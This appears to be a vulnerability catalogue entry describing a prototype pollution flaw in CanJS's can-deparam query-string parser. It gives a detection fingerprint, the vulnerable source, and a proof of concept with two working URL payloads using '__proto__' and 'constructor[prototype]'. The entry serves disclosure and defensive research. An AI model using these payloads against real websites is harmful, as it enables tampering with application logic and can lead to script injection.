## CanJS deparam

URL: https://canjs.com/doc/can-deparam.html  
URL: https://www.npmjs.com/package/can-deparam

### JS Fingerprint
```
return (typeof can != 'undefined' && typeof can.deparam != 'undefined')
```

### Vulnerable code fragment

https://github.com/canjs/can-deparam/blob/8c902fc6b9f2e6107229d76ee3990f74952a804a/can-deparam.js

```js
keyBreaker = /([^\[\]]+)|(\[\])/g,
...
module.exports = namespace.deparam = function (params, valueDeserializer) {
    valueDeserializer = valueDeserializer || idenity;
    var data = {}, pairs, lastPart;
    if (params && paramTest.test(params)) {
        pairs = params.split('&');
        pairs.forEach(function (pair) {
            var parts = pair.split('='),
                key = prep(parts.shift()),
                value = prep(parts.join('=')),
                current = data;
            if (key) {
                parts = key.match(keyBreaker);
                for (var j = 0, l = parts.length - 1; j < l; j++) {
                    var currentName = parts[j],
                        nextName = parts[j + 1],
                        currentIsArray = isArrayLikeName(currentName) && current instanceof Array;
                    if (!current[currentName]) {
                        if(currentIsArray) {
                            current.push( isArrayLikeName(nextName) ? [] : {} );
                        } else {
                            // If what we are pointing to looks like an `array`
                            current[currentName] = isArrayLikeName(nextName) ? [] : {};
                        }

                    }
                    if(currentIsArray) {
                        current = current[current.length - 1];
                    } else {
                        current = current[currentName];
                    }

                }
                lastPart = parts.pop();
                if ( isArrayLikeName(lastPart) ) {
                    current.push(valueDeserializer(value));
                } else {
                    current[lastPart] = valueDeserializer(value);
                }
            }
        });
    }
    return data;
}; 
```

### PoC
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/can.js/6.6.0/core.min.js"></script>
<script>
  can.deparam(location.search.slice(1))
</script>
```
```
?__proto__[test]=test
?constructor[prototype][test]=test
```